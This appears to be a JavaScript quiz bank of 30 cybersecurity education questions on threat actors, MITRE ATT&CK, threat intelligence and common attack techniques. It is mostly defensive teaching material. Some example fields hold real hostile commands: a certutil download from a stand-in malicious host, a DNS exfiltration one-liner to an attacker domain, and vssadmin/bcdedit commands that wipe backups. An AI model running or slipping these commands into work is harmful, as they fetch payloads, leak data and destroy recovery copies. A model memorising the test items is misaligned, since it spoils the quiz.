// topic6_questions.js
// 30 Moderate to Expert Questions on Cyber Threat Landscape, Threat Actor Taxonomy, MITRE ATT&CK, CTI, and Pyramid of Pain

const questions = [
  {
    question: "What is the Cyber Threat Landscape and why is it constantly shifting?",
    shortAnswer: "The Cyber Threat Landscape is the overall collection of active cyber threats, threat actors, vulnerabilities, malware variants, attack vectors, and exploitation trends targeting digital assets; it evolves constantly due to emerging technologies, cloud migrations, AI offensive tooling, and geopolitical conflicts.",
    explanation: "Security teams must continuously monitor the landscape to update defensive postures before new attack techniques strike their infrastructure.",
    hint: "The overall environment of all active hackers, viruses, zero-day bugs, and attack methods globally.",
    level: "basic",
    codeExample: "ThreatLandscape = { Actors: ['APTs', 'Ransomware Gangs'], Vectors: ['Zero-Days', 'Phishing'], Trends: ['AI Deepfakes'] };"
  },
  {
    question: "What are the Five Major Categories of Cyber Threat Actors?",
    shortAnswer: "1. Script Kiddies (unskilled tool users); 2. Hacktivists (ideologically/politically motivated); 3. Cyber Criminal Syndicates (financially motivated e-Crime); 4. Insider Threats (malicious or negligent employees); 5. Nation-State APTs (geopolitically funded military intelligence agencies).",
    explanation: "Understanding threat actor motivations helps defenders in Kolkata prioritize appropriate countermeasure budgets.",
    hint: "Script Kiddies (amateurs), Hacktivists (protesters), Cyber Criminals (money), Insiders (staff), Nation-States (spies).",
    level: "basic",
    codeExample: "ThreatActorTaxonomy = ['Script Kiddie', 'Hacktivist', 'e-Crime Syndicate', 'Insider Threat', 'Nation-State APT'];"
  },
  {
    question: "What is an Advanced Persistent Threat (APT) and what makes it distinct from ordinary malware?",
    shortAnswer: "An APT is a well-resourced, highly sophisticated threat actor (typically state-sponsored) that conducts stealthy, multi-phase continuous cyber operations; unlike smash-and-grab ransomware, APTs dwell undetected for months to steal state secrets or prepare critical infrastructure sabotage.",
    explanation: "APTs use custom fileless exploits, zero-days, and living-off-the-land techniques (LOLBins) to blend into legitimate traffic in Barrackpore.",
    hint: "State-sponsored military hackers who sneak inside networks for months without making noise.",
    level: "expert",
    codeExample: "APT_Characteristics = { DwellTime: '180+ Days', Funding: 'State-Sponsored', Objective: 'Espionage / Strategic Sabotage' };"
  },
  {
    question: "What is the 'Pyramid of Pain' formulated by David Bianco?",
    shortAnswer: "A conceptual model illustrating how difficult it is for an adversary to overcome the loss of different indicators when blocked by defenders: 1. Hash Values (Trivial) ➔ 2. IP Addresses (Easy) ➔ 3. Domain Names (Simple) ➔ 4. Network/Host Artifacts (Annoying) ➔ 5. Tools (Challenging) ➔ 6. TTPs - Tactics, Techniques & Procedures (Tough!).",
    explanation: "Blocking adversary TTPs forces attackers to reinvent their entire operational methodology, inflicting maximum pain on the hacker.",
    hint: "Pyramid showing that blocking TTPs (hacker habits) hurts attackers far more than blocking IP addresses.",
    level: "expert",
    codeExample: "PyramidOfPain = ['Hash Values (Trivial)', 'IPs (Easy)', 'Domains (Simple)', 'Artifacts (Annoying)', 'Tools (Challenging)', 'TTPs (Tough)'];"
  },
  {
    question: "What is MITRE ATT&CK and how is it used in Cyber Threat Intelligence?",
    shortAnswer: "A globally standardized, curated knowledge base of adversary Tactics, Techniques, and Procedures (TTPs) based on real-world observations; it structures the attack lifecycle into 14 tactical objectives (e.g. Initial Access, Execution, Persistence, Lateral Movement, Exfiltration).",
    explanation: "Allows security analysts in Jadavpur to map defensive detection coverage directly against real-world APT techniques.",
    hint: "A giant periodic table of hacker tactics and techniques used to test and grade enterprise defenses.",
    level: "moderate",
    codeExample: "MITRE_ATTACK: Tactic 'Initial Access' -> Technique 'T1566 Phishing' -> Sub-Technique 'T1566.001 Spearphishing Attachment'"
  },
  {
    question: "What is the cost in Indian Rupees (₹) for a Commercial Cyber Threat Intelligence (CTI) Feed Subscription?",
    shortAnswer: "Approximately ₹3,80,000 to ₹8,50,000 per year (e.g. Recorded Future, Mandiant, CrowdStrike Falcon Intelligence) providing machine-readable STIX/TAXII feeds, dark web monitoring, and APT actor tracking.",
    explanation: "CTI feeds automatically stream newly discovered malicious C2 IPs and malware hashes into firewalls in Kolkata.",
    hint: "Commercial Threat Intelligence feed costs ₹3,80,000 – ₹8,50,000 per year in Indian Rupees.",
    level: "moderate",
    codeExample: "Annual_CTI_Budget = ₹5,20,000; // Real-Time STIX/TAXII Threat Intelligence Feed + Dark Web Ingestion"
  },
  {
    question: "What are the Three Levels of Cyber Threat Intelligence (Strategic, Operational, Tactical)?",
    shortAnswer: "1. Strategic CTI: High-level trends, geopolitical motivations, and financial risks designed for executive CISOs and Boards; 2. Operational CTI: Specific adversary campaigns, actor profiles, and TTPs designed for SOC leads; 3. Tactical CTI: Low-level technical IoCs (malicious IPs, hashes, URLs) ingested directly by firewalls and SIEMs.",
    explanation: "All three tiers are required to guide executive spending, defensive playbooks, and automated firewall blocks in Ichapur.",
    hint: "Strategic (executives/business risk), Operational (adversary playbooks), Tactical (technical IP/hash IoCs).",
    level: "moderate",
    codeExample: "CTI_Levels = { Strategic: 'Board Risk Reports', Operational: 'APT TTP Profiles', Tactical: 'STIX/TAXII IoC Feeds' };"
  },
  {
    question: "What are Indicators of Compromise (IoCs) vs Indicators of Attack (IoAs)?",
    shortAnswer: "IoCs are forensic artifacts showing that a system HAS ALREADY BEEN breached in the past (e.g. known malware MD5 hash, rogue IP); IoAs focus on real-time adversary intent and behavioral execution patterns currently unfolding (e.g. unauthorized memory injection, lateral WMI execution).",
    explanation: "IoAs allow EDR platforms in Barrackpore to stop brand-new, never-before-seen zero-day attacks before malware is written to disk.",
    hint: "IoC is past evidence (a footprint); IoA is real-time behavior (someone picking a lock right now).",
    level: "expert",
    codeExample: "IoC_vs_IoA = { IoC: 'SHA256 Hash of Known Trojan (Reactive)', IoA: 'PowerShell executing hidden Base64 memory payload (Proactive)' };"
  },
  {
    question: "What is Living-off-the-Land (LotL) and LOLBins in modern cyber attacks?",
    shortAnswer: "A stealth attack technique where adversaries use legitimate, built-in operating system administrative tools (e.g. PowerShell, WMI, certutil, vssadmin, bash) to execute attacks rather than dropping custom malware, bypassing traditional antivirus scanners completely.",
    explanation: "Adversaries in Kolkata use `certutil.exe` to download malicious payloads because antivirus tools trust Windows system binaries.",
    hint: "Hackers using built-in Windows tools like PowerShell so antivirus scanners think it is normal admin work.",
    level: "expert",
    codeExample: "LOLBin_Attack: certutil.exe -urlcache -split -f http://malicious.site/payload.exe payload.exe"
  },
  {
    question: "What is Ransomware-as-a-Service (RaaS) and how does it drive modern e-Crime?",
    shortAnswer: "An illicit franchise business model where elite malware developers create ransomware payloads and automated payment portals, leasing them to criminal 'affiliates' who execute network intrusions in exchange for a 20% to 30% cut of extorted cryptocurrency ransoms.",
    explanation: "Democratizes military-grade cyber extortion, allowing low-skilled criminals to launch devastating multi-crore attacks across West Bengal.",
    hint: "Criminal subscription model where virus creators rent out ransomware to amateur hackers for a cut of profits.",
    level: "basic",
    codeExample: "RaaS_Ecosystem: CoreDeveloper(Writes Ransomware) <--> Affiliate(Breaches Network) -> 80%/20% Profit Split"
  },
  {
    question: "What is Hacktivism and how do hacktivist threat actors operate?",
    shortAnswer: "Individuals or loosely organized activist collectives that launch cyber attacks (DDoS floods, website defacements, doxxing, sensitive data leaks) to promote a political, social, religious, or environmental agenda rather than financial profit.",
    explanation: "Examples include Anonymous taking down oppressive regime web portals during political protests.",
    hint: "Hackers motivated by political or social causes rather than stealing money.",
    level: "basic",
    codeExample: "Hacktivist_Attack = { Objective: 'Political Protest', PrimaryTools: ['LOIC DDoS', 'Web Defacement', 'Doxxing'] };"
  },
  {
    question: "What is an Insider Threat and what are the three sub-types (Malicious, Negligent, Compromised)?",
    shortAnswer: "1. Malicious Insider: An employee who deliberately steals IP or sabotages systems for money or revenge; 2. Negligent Insider: An untrained employee who accidentally clicks phishing links or misconfigures cloud buckets; 3. Compromised Insider: An employee whose valid credentials were stolen by an external adversary.",
    explanation: "User and Entity Behavior Analytics (UEBA) in Barrackpore detects anomalous insider data transfers at odd hours.",
    hint: "1. Malicious (evil intent), 2. Negligent (clumsy mistake), 3. Compromised (hacked account).",
    level: "moderate",
    codeExample: "InsiderTypes = ['Malicious Saboteur', 'Negligent Worker', 'Compromised Account'];"
  },
  {
    question: "What is STIX and TAXII in automated threat intelligence sharing?",
    shortAnswer: "STIX (Structured Threat Information Expression) is a standardized JSON-based language for describing cyber threat information (actors, campaigns, TTPs, IoCs); TAXII (Trusted Automated Exchange of Intelligence Information) is the transport application protocol used to securely exchange STIX messages over HTTPS.",
    explanation: "Enables automated threat feeds in Kolkata to update perimeter firewall blocklists without manual human intervention.",
    hint: "STIX is the language format for threat data; TAXII is the secure pipeline that sends it to firewalls.",
    level: "expert",
    codeExample: "STIX_JSON = { 'type': 'indicator', 'pattern': '[ipv4-addr:value = \"198.51.100.22\"]', 'valid_from': '2026-08-22T00:00:00Z' };"
  },
  {
    question: "What is Dwell Time in cyber intrusions and why is minimizing it critical?",
    shortAnswer: "The total number of days or hours an adversary remains undetected inside a victim's network from initial compromise until final discovery; the global median dwell time is approximately 10 to 16 days.",
    explanation: "A long dwell time gives attackers ample opportunity to map Active Directory, compromise domain controllers, and exfiltrate databases in Ichapur.",
    hint: "The number of days an attacker hides inside your network before you finally notice them.",
    level: "basic",
    codeExample: "DwellTimeReduction: Target = '< 24 Hours'; Tool = 'Managed Detection and Response (MDR) + Threat Hunting';"
  },
  {
    question: "What is Credential Stuffing and how do threat actors automate it?",
    shortAnswer: "An automated attack where adversaries take massive lists of leaked username/password combinations from past third-party data breaches and test them programmatically against hundreds of other websites using botnets, exploiting human password reuse.",
    explanation: "Defended using CAPTCHAs, rate limiting, and FIDO2 multi-factor authentication in Jadavpur.",
    hint: "Automated bots trying millions of stolen passwords from other websites to break into user accounts.",
    level: "basic",
    codeExample: "CredentialStuffing: Botnet tests 50,000 stolen password pairs/sec against banking login API."
  },
  {
    question: "What is a Zero-Day Broker and how does the vulnerability black/gray market operate?",
    shortAnswer: "Commercial entities (e.g. Zerodium, Crowdfense) and black-hat underground brokers that buy undisclosed software zero-day exploits from security researchers for millions of rupees and sell them exclusively to government intelligence agencies or cyber criminal cartels.",
    explanation: "Zero-click iOS and Android exploits sell for upwards of ₹15 to ₹25 Crore on international broker markets.",
    hint: "Brokers who buy secret unpatched software bugs for millions of dollars and sell them to governments or hackers.",
    level: "expert",
    codeExample: "ZeroDayMarket: iOS Zero-Click RCE Exploit -> Sold for ₹20 Crore to Intelligence Contractors"
  },
  {
    question: "What is a Drive-by Download in web-based attack vectors?",
    shortAnswer: "The unintentional, automatic download and execution of malicious code onto a user’s computer simply by visiting a compromised or malicious web page, requiring zero clicks or interaction from the victim by exploiting browser memory flaws.",
    explanation: "Prevented by keeping browsers strictly updated and using browser isolation sandboxes in Kolkata.",
    hint: "Getting infected with a virus just by opening a web page without clicking anything.",
    level: "basic",
    codeExample: "DriveByDownload: MaliciousIframe -> ExploitsBrowserVulnerability -> InjectsShellcodeInRAM"
  },
  {
    question: "What is Typosquatting & Software Supply Chain Dependency Confusion?",
    shortAnswer: "Adversaries publish malicious software packages on open-source registries (npm, PyPI) with names nearly identical to popular libraries (e.g. `collorama` instead of `colorama`) or matching internal company package names, tricking developers into building malware directly into applications.",
    explanation: "Defended via private artifact repository mirrors and strict package hash lockfiles in Barrackpore.",
    hint: "Publishing fake software libraries with misspelled names so developers accidentally install malware.",
    level: "moderate",
    codeExample: "Typosquatting: Attacker uploads 'loddash' containing reverse shell -> Developer runs `npm install loddash`"
  },
  {
    question: "What is Lateral Movement in the Cyber Threat Landscape?",
    shortAnswer: "The phase of an attack where an adversary, having breached a single low-privilege endpoint, pivots across the internal network, harvesting credentials (Pass-the-Hash, Kerberoasting) and compromising adjacent servers to reach crown jewel databases.",
    explanation: "Prevented by internal 802.1Q VLAN microsegmentation and disabling SMBv1 in Ichapur.",
    hint: "An attacker hopping from one computer to another inside the company network to reach the main database.",
    level: "moderate",
    codeExample: "LateralMovement: Compromise(Receptionist_PC) -> DumpLSASS_Credentials() -> SSH_To_Core_Database_Server"
  },
  {
    question: "What is Kerberoasting in Active Directory domain attacks?",
    shortAnswer: "A post-exploitation attack where an authenticated domain user requests Kerberos service tickets (TGS) for service accounts with Service Principal Names (SPNs), extracts the encrypted ticket hashes, and cracks them offline with GPU clusters to obtain plaintext administrative passwords.",
    explanation: "Defended by using Group Managed Service Accounts (gMSA) with 128-character complex passwords in Kolkata.",
    hint: "Requesting encrypted service tickets from a domain controller and cracking them offline to get admin passwords.",
    level: "expert",
    codeExample: "Kerberoasting: RequestServiceTicket(SPN = 'MSSQLSvc/db01') -> ExtractTGS_Hash() -> Offline_Hashcat_Crack"
  },
  {
    question: "What is Data Exfiltration over DNS (DNS Tunneling)?",
    shortAnswer: "A stealth technique where malware encodes stolen confidential data into subdomains of DNS lookup queries (e.g. `secretdata123.attacker.com`), bypassing corporate web firewalls since standard DNS port 53 outbound traffic is usually allowed.",
    explanation: "Defended using Next-Gen Firewalls with DNS deep packet inspection and anomalous query length detection in Jadavpur.",
    hint: "Stealing company data by hiding secret information inside ordinary DNS website lookup requests.",
    level: "expert",
    codeExample: "DNSTunneling: nslookup $(base64 stolen_record.txt).c2-tunnel.attacker-domain.com"
  },
  {
    question: "What is a Botnet and what is a Command and Control (C2 / C&C) Server?",
    shortAnswer: "A botnet is a vast network of compromised computers, servers, or IoT devices (zombies) controlled remotely by an attacker; the Command and Control server is the centralized infrastructure that sends operational commands and receives stolen telemetry from all botnet nodes.",
    explanation: "Botnets like Mirai compromise hundreds of thousands of IP cameras to launch multi-terabit DDoS attacks across West Bengal.",
    hint: "A botnet is an army of infected computers; the C2 server is the master computer giving them orders.",
    level: "basic",
    codeExample: "BotnetArchitecture: C2_Server --SendsCommand('DDoS Target IP')--> 100,000_Infected_IoT_Bots"
  },
  {
    question: "What is Business Email Compromise (BEC) Vendor Fraud (Invoice Redirection)?",
    shortAnswer: "An adversary monitors compromised vendor email inboxes, discovers upcoming multi-lakh invoice payments, and sends an urgent email from the legitimate thread claiming the vendor’s bank details have changed, diverting funds to a criminal mule account.",
    explanation: "Bypasses technical spam filters because the email originates from a legitimate, compromised vendor mailbox in Barrackpore.",
    hint: "Hackers hijack a supplier's real email thread to send fake updated bank account details for invoice payments.",
    level: "moderate",
    codeExample: "InvoiceFraud: Compromised_Vendor_Email -> 'Please send payment to our new SBI account' -> Funds_Diverted"
  },
  {
    question: "What is Man-in-the-Browser (MitB) Attack?",
    shortAnswer: "A banking trojan (e.g. Zeus) that infects a user’s web browser via a malicious extension or DLL injection; when the user logs into their legitimate bank portal and authorizes a transfer, the malware secretly modifies the recipient account and amount on-the-fly inside the browser DOM.",
    explanation: "Renders standard two-factor SMS OTPs ineffective unless out-of-band transaction details confirmation is enforced in Kolkata.",
    hint: "A virus inside your browser that quietly changes bank transfer account numbers as you click Submit.",
    level: "expert",
    codeExample: "MitB_Action: Intercept_Form_Submit() -> Replace(DestinationAccount = 'Criminal_Account') -> SubmitToBank"
  },
  {
    question: "What is Spear-Phishing vs Whaling?",
    shortAnswer: "Spear-Phishing is a highly customized, research-driven phishing email targeted at a specific individual or department; Whaling is spear-phishing specifically targeted at high-profile 'big fish' executives (CEOs, CFOs, Board Members) to authorize major wire transfers.",
    explanation: "Whaling emails reference real company board members and financial terms to establish false authenticity in Ichapur.",
    hint: "Spear-phishing targets specific employees; Whaling targets top CEOs and CFOs.",
    level: "basic",
    codeExample: "Whaling_Target: CEO / CFO -> Personalized pretexting referencing current company merger discussions."
  },
  {
    question: "What is Shadow Copy Deletion in Ransomware execution scripts?",
    shortAnswer: "Ransomware scripts execute commands like `vssadmin delete shadows /all /quiet` and `wmic shadowcopy delete` to permanently wipe all Windows Volume Shadow Copy backup snapshots, preventing victims from restoring files using built-in OS recovery.",
    explanation: "EDR agents in Kolkata monitor and immediately terminate any unauthorized process invoking `vssadmin delete shadows`.",
    hint: "Ransomware command that deletes Windows recovery snapshots so you cannot restore your files.",
    level: "moderate",
    codeExample: "Ransomware_Script: vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No"
  },
  {
    question: "What is Threat Hunting Hypothesis Generation?",
    shortAnswer: "The process where human security analysts formulate educated assumptions about how an undetected adversary might be operating inside their network based on new CTI reports (e.g. 'Adversaries are using scheduled tasks for persistence in our financial VLAN'), followed by data telemetry queries.",
    explanation: "Proactively discovers stealth adversaries in Barrackpore before automated alarms trigger.",
    hint: "Creating a theory of how hackers might be hiding in your network and searching server logs to prove it.",
    level: "expert",
    codeExample: "HuntingHypothesis: 'An adversary has established WMI persistence' -> QuerySIEM(Process = 'wmic.exe /create');"
  },
  {
    question: "What is Reverse Engineering of Malware in Threat Intelligence labs?",
    shortAnswer: "The forensic disassembly and decompilation of malicious binaries (using tools like Ghidra, IDA Pro, x64dbg) in isolated sandboxes to analyze execution logic, extract hardcoded C2 IP addresses, discover encryption flaws, and formulate YARA detection rules.",
    explanation: "Students in Jadavpur analyze live malware samples to generate national cyber threat signatures.",
    hint: "Taking apart a virus in a secure lab to see how it works and extract its secret server addresses.",
    level: "expert",
    codeExample: "MalwareAnalysis: Disassemble(trojan.bin) -> Extract(C2_IP = '203.0.113.88') -> Generate_YARA_Rule();"
  },
  {
    question: "What is Cyber Threat Profiling and Actor Attribution Confidence Scoring?",
    shortAnswer: "The structured methodology of evaluating malware code similarities, compile timestamps, language artifacts, infrastructure overlaps, and geopolitical victimology to assign a probability score (e.g. 'High Confidence attribution to APT29').",
    explanation: "Prevents false-flag misattribution during national security investigations in Kolkata.",
    hint: "Scoring the likelihood that a specific nation's hacking unit is responsible for an attack.",
    level: "expert",
    codeExample: "AttributionConfidence = { Actor: 'APT28', Confidence: '85% (High)', Evidence: ['Custom XOR Key', 'Timezone Stamps'] };"
  },
  {
    question: "What is the ultimate golden rule for understanding and mastering the Cyber Threat Landscape?",
    shortAnswer: "'Map every threat actor motivation across the taxonomy; move up the Pyramid of Pain by detecting adversary TTPs via MITRE ATT&CK; minimize dwell time with behavioral IoAs; and budget commercial threat intelligence in Indian Rupees (₹)!'",
    explanation: "This complete rule synthesizes actor profiling, advanced CTI frameworks, proactive behavioral hunting, and financial procurement budgeting.",
    hint: "Taxonomy + Pyramid of Pain + MITRE ATT&CK TTPs + IoAs + CTI budgets in ₹.",
    level: "moderate",
    codeExample: "GoldenRule: ProfileThreatActors() -> MasterPyramidOfPain() -> MapMITRE_TTPs() -> HuntWithIoAs() -> BudgetInRupees(₹);"
  }
];

export default questions;
